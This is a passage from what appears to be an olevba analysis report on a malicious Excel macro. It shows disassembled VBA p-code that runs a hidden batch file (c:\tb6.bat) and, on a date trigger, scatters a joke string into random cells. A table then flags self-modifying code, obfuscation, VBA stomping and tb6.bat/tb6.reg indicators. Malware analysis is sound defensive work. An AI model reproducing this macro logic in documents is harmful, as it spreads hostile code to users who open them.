' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #59:
' 	LitStr 0x000A "c:\tb6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	ArgsCall Read 0x0000 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ForStep 
' Line #64:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St ltr 
' Line #65:
' 	Ld ltr 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St Where 
' Line #66:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #67:
' 	LitStr 0x001B "-(Zou-zou-zou-zoubidaaaaa)-"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #68:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #69:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #70:
' 	LitStr 0x000D "Comic Sans MS"
' 	MemStWith New 
' Line #71:
' 	LitDI2 0x0008 
' 	MemStWith Size 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld ltr 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld ltr 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #77:
' 	LitStr 0x0027 "- Y'a un bug, mais c'est pas grave... -"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #78:
' 	LitStr 0x0003 "A:A"
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tb6.reg             |Executable file name                         |
|IOC       |TB6.REG             |Executable file name                         |
|IOC       |tb6.bat             |Executable file name                         |
|IOC       |TB6.BAT             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

